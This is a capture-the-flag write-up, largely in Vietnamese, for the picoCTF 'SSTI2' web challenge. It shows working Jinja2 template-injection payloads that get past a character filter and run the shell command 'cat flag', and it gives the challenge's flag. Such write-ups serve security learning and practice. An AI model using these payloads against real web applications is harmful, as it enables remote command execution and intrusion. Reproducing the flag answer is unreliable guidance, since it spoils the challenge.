# SSTI2 - Medium
## Description
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)  
I heard templating is a cool and modular way to build web apps!
## Analysis
Challenge cơ bản giống với SSTI1, nhưng lần này có thêm một vài kiểm tra với đầu vào.  
Sau một vài thử nghiệm thấy được server sẽ xóa tất cả các dấu `_`, `.`, `[` và `]` tồn tại trong đầu vào
## Solution
Nói chung, payload sẽ giống SSTI1 với một vài điều chỉnh  
Nhìn lại payload SSTI1:
```
{{ config.__class__.__init__.__globals__['os'].popen('cat flag').read() }}
```
Các cách để bypass filter được tìm thấy tại [bài viết này](https://viblo.asia/p/server-side-template-injection-vulnerabilities-ssti-cac-lo-hong-ssti-phan-3-Ny0VGjAYLPA)
```
url: http://<host>:<port>/announce?a=__class__&b=__init__&c=__globals__
```
```
payload: {{config|attr(request|attr('args')|attr('get')('a'))|attr(request|attr('args')|attr('get')('b'))|attr(request|attr('args')|attr('get')('c'))|attr('get')('os')|attr('popen')('cat flag')|attr('read')()}}
```
## Flag
```
picoCTF{sst1_f1lt3r_byp4ss_7c3c6e7f}
```